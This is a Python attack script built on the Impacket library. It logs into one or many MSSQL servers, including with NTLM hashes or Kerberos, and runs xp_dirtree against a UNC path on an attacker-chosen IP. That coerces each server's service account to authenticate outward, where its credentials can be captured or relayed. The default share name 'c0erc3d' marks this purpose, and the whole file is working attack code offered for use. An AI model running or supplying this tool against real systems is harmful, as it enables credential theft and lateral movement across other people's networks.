#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# Description:
#   [MS-TDS] & [MC-SQLR] example focused on xp_dirtree functionality.
#   This script allows automatic execution of xp_dirtree against multiple SQL servers
#   and can target specific IP with the xp_dirtree command.
#

import argparse
import sys
import logging
import os

from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket import version, tds

class XP_DIRTREE_EXECUTOR:
    def __init__(self, share_name="c0erc3d"):
        self.share_name = share_name

    def execute_xp_dirtree(self, sql, target_ip):
        """Execute xp_dirtree against the target IP with specified share name"""
        command = f"\\\\{target_ip}\\{self.share_name}"
        query = f"exec master.sys.xp_dirtree '{command}',1,1"
        print(f"[*] Executing: {query}")
        
        try:
            sql.sql_query(query)
            sql.printReplies()
            sql.printRows()
            return True
        except Exception as e:
            print(f"[-] Error executing xp_dirtree against {target_ip}: {str(e)}")
            return False

def process_ip_file(filename):
    """Read IP addresses from a file, one per line"""
    if not os.path.exists(filename):
        print(f"[-] File not found: {filename}")
        return []
    
    with open(filename, 'r') as f:
        ips = [line.strip() for line in f if line.strip()]
    
    return ips

def connect_and_execute(server_ip, port, username, password, domain, db, windows_auth, 
                        hashes, k, aes_key, dc_ip, xp_target, share_name):
    """Connect to MSSQL server and execute xp_dirtree command"""
    print(f"\n[*] Connecting to MSSQL server: {server_ip}")
    
    # Connect to MSSQL server
    ms_sql = tds.MSSQL(server_ip, int(port), server_ip)
    ms_sql.connect()
    
    try:
        # Login to the MSSQL server
        if k is True:
            res = ms_sql.kerberosLogin(db, username, password, domain, hashes, aes_key, kdcHost=dc_ip)
        else:
            res = ms_sql.login(db, username, password, domain, hashes, windows_auth)
        ms_sql.printReplies()
    except Exception as e:
        logging.debug("Exception:", exc_info=True)
        logging.error(str(e))
        res = False
        
    if res is True:
        # Create xp_dirtree executor
        executor = XP_DIRTREE_EXECUTOR(share_name)
        
        # Execute xp_dirtree against target
        print(f"[*] Target server: {server_ip}")
        print(f"[*] xp_dirtree target: {xp_target}")
        executor.execute_xp_dirtree(ms_sql, xp_target)
    else:
        print(f"[-] Failed to login to MSSQL server: {server_ip}")
            
    # Disconnect from the MSSQL server
    ms_sql.disconnect()

if __name__ == '__main__':
    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help=True, 
                                     description="MSSQL xp_dirtree executor - connects to SQL servers and executes xp_dirtree")

    group = parser.add_argument_group('connection')
    connection = parser.add_mutually_exclusive_group(required=True)
    connection.add_argument('-server', action='store', help='Single MSSQL server IP to connect to')
    connection.add_argument('-ip-file', action='store', 
                          help='File containing MSSQL server IPs to connect to (one IP per line)')
    
    parser.add_argument('-port', action='store', default='1433', 
                        help='target MSSQL port (default 1433)')
    parser.add_argument('-db', action='store', 
                        help='MSSQL database instance (default None)')
    parser.add_argument('-windows-auth', action='store_true', default=False, 
                        help='whether or not to use Windows Authentication (default False)')
    parser.add_argument('-debug', action='store_true', 
                        help='Turn DEBUG output ON')
    parser.add_argument('-share-name', action='store', default='c0erc3d',
                        help='Share name to use in xp_dirtree command (default: c0erc3d)')
    
    # Add arguments specific to xp_dirtree functionality
    parser.add_argument('-xp-target', action='store', required=True,
                        help='Target IP to use in xp_dirtree command')
    
    # Authentication parameters
    parser.add_argument('-domain', action='store', default='',
                       help='Domain name for authentication')
    parser.add_argument('-username', action='store', required=True,
                       help='Username for authentication')
    parser.add_argument('-password', action='store', default='',
                       help='Password for authentication')

    group = parser.add_argument_group('authentication options')
    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", 
                      help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", 
                      help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", 
                      help='Use Kerberos authentication. Grabs credentials from ccache file '
                      '(KRB5CCNAME) based on target parameters.')
    group.add_argument('-aesKey', action="store", metavar="hex key", 
                      help='AES key to use for Kerberos Authentication (128 or 256 bits)')
    group.add_argument('-dc-ip', action='store', metavar="ip address",
                      help='IP Address of the domain controller')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()
    
    # Init the logger
    if options.debug:
        logging.getLogger().setLevel(logging.DEBUG)
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)
    
    try:
        logger.init()
    except TypeError:
        pass

    # Get authentication parameters
    domain = options.domain
    username = options.username
    password = options.password

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass
        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True
    
    # Get server IPs
    server_ips = []
    if options.server:
        server_ips = [options.server]
    elif options.ip_file:
        server_ips = process_ip_file(options.ip_file)
        if not server_ips:
            print("[-] No valid IPs found in the specified file.")
            sys.exit(1)
    
    # Execute xp_dirtree on each server
    print(f"[*] Connecting to {len(server_ips)} MSSQL servers")
    for server_ip in server_ips:
        connect_and_execute(
            server_ip=server_ip,
            port=options.port,
            username=username,
            password=password,
            domain=domain,
            db=options.db,
            windows_auth=options.windows_auth,
            hashes=options.hashes,
            k=options.k,
            aes_key=options.aesKey,
            dc_ip=options.dc_ip,
            xp_target=options.xp_target,
            share_name=options.share_name
        )
